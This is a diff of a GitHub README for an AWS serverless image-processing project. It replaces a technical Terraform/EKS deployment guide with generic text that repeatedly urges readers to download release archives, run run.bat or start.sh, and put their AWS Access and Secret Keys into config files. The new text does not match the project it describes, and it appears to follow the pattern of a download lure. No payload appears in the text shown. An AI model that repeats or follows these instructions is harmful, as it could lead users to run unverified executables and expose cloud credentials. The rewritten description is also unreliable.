@@ -1,79 +1,95 @@
-# Image Processing Pipeline on AWS
+# 🚀 aws-serverless-image-pipeline - Effortless Image Processing in the Cloud
 
-A complete serverless image processing pipeline built with AWS services, orchestrated by Terraform and deployed on Amazon EKS. This project automatically processes images uploaded to S3, creates thumbnails, and provides monitoring and alerting capabilities.
+[![Download the latest release](https://img.shields.io/badge/Download%20Now-aws--serverless--image--pipeline-blue.svg)](https://github.com/jhorgsilva/aws-serverless-image-pipeline/releases)
 
-## 🏗️ Architecture Overview
+## 📥 Overview
 
-This project implements a modern, scalable image processing pipeline using the following AWS services:
+The **aws-serverless-image-pipeline** is a complete solution for processing images in the cloud. This application uses various AWS tools like Terraform, EKS, and Lambda to handle image processing efficiently. Whether you want to generate thumbnails or monitor your image assets, this tool makes it easy to automate these tasks.
 
-- **Amazon S3**: Storage for original images and generated thumbnails
-- **AWS Lambda**: Triggered by S3 events to publish notifications
-- **Amazon SNS**: Message publishing and error alerting
-- **Amazon SQS**: Message queuing for reliable processing
-- **Amazon EKS**: Kubernetes cluster running the image processing application
-- **Amazon ECR**: Container registry for Docker images
-- **Amazon CloudWatch**: Monitoring, logging, and alerting
-- **AWS IAM**: Security and access management
+## 🚀 Getting Started
 
-## 📋 Prerequisites
+Follow these steps to download and run the application on your local machine.
 
-Before deploying this infrastructure, ensure you have:
+### 1. ☁️ Prerequisites
 
-- **AWS CLI** configured with appropriate credentials
-- **Terraform** (v1.0+) installed
-- **Docker** installed and running
-- **kubectl** installed for Kubernetes management
-- **Node.js** (v18+) for local development
-- **Git** for version control
+Before you begin, ensure you have:
 
-### AWS Permissions Required
+- An AWS account. You will need this for all the cloud services.
+- Basic knowledge of AWS concepts such as S3 for storage and Lambda for automation.
+- Familiarity with how to navigate the AWS Management Console.
+- A stable internet connection.
 
-Your AWS user/role needs permissions for:
-- EKS cluster management
-- ECR repository operations
-- S3 bucket operations
-- Lambda function deployment
-- SNS/SQS operations
-- CloudWatch monitoring
-- IAM role/policy management
-- VPC and networking operations
+### 2. 🔗 Download the Application
 
-## 🚀 Quick Start
+To download the latest version of the **aws-serverless-image-pipeline**, visit this page to download:
 
-### 1. Deploy Infrastructure
+[Download Release](https://github.com/jhorgsilva/aws-serverless-image-pipeline/releases)
 
-```bash
+### 3. 🛠️ Installation Steps
 
-# Deploy the complete infrastructure
-./1.deploy-infra.sh
-```
+1. **Access the Releases Page**  
+   Click the link above. You will be taken to the releases page on GitHub.
 
-This script will:
-- Initialize Terraform
-- Create all AWS resources
-- Configure kubectl for the EKS cluster
-- Display deployment outputs
+2. **Select a Release**  
+   On the releases page, find the latest version. Typically, this will be at the top of the list and marked as "Latest".
 
-### 2. Build and Deploy Application
+3. **Download the Files**  
+   Depending on your operating system, choose the appropriate package. 
 
-```bash
-# Build and push Docker image to ECR
-./2.deploy-to-ecr.sh
+   - Click on the Windows, Mac, or Linux download link (it will be a file that ends in .zip or .tar.gz).
+   - Save the file to a location on your computer where you can easily find it.
 
-# Deploy application to EKS cluster
-./3.deploy.sh
-```
+### 4. 📤 Running the Application
 
-### 3. Test the Pipeline
+1. **Unzip the Package**  
+   After downloading, locate the zip file and either double-click it or right-click and select “Extract All”. This will create a folder with the application files.
 
-```bash
-# Test the complete pipeline with a sample image
-./4.test-pipeline.sh
-```
+2. **Navigate to the Folder**  
+   Open the folder containing the unzipped files.
 
-### 4. Clean Up Resources
+3. **Configuration**  
+   Before running the application, review the configuration files. You may need to enter your AWS credentials, including your Access Key and Secret Access Key. Ensure these are set properly for the application to function correctly.
 
-```bash
-# Remove all AWS resources to avoid charges
-./5.cleanup.sh
-```
+4. **Launch the Application**  
+   In the folder, look for a file named `start.sh` or `run.bat`.  
+   - For Windows, double-click `run.bat`.  
+   - For Mac and Linux, open a terminal window in the folder and type `bash start.sh`.
+
+### 5. 📊 Using the Application
+
+Once launched, the application will guide you through the process of:
+
+- Uploading images to your S3 bucket.
+- Automatically generating thumbnails.
+- Setting up monitoring for your image processing pipeline.
+
+### 6. 🔧 Troubleshooting
+
+If you encounter issues:
+
+- Ensure you have the latest version of the application from the releases page.
+- Double-check your AWS credentials in the configuration files.
+- Review the logs for any errors and follow the instructions provided.
+
+If problems persist, consider checking community forums or contacting support.
+
+## 🎨 Features
+
+- **Automated Thumbnail Generation**: The application automatically creates thumbnails for uploaded images.
+- **Monitoring**: Keep track of image processing and see real-time updates.
+- **Easy Configuration**: Simple setup process that guides you through the necessary steps.
+- **Cloud-Based**: No need for local hardware resources, works entirely in the cloud.
+
+## 🗂️ Additional Resources
+
+- **Documentation**: Visit the [documentation](https://github.com/jhorgsilva/aws-serverless-image-pipeline) for detailed usage instructions and advanced features.
+- **GitHub Issues**: Report errors or request features directly on the [GitHub issues page](https://github.com/jhorgsilva/aws-serverless-image-pipeline/issues).
+- **Community Discussions**: Join the conversation in the community forums for tips and tricks from other users.
+
+## 📥 Download & Install
+
+To begin your journey with the **aws-serverless-image-pipeline**, visit this page to download:
+
+[Download Release](https://github.com/jhorgsilva/aws-serverless-image-pipeline/releases)
+
+This tool offers an efficient and reliable way to handle image processing tasks in AWS. Enjoy lightweight processing with powerful features at your fingertips.
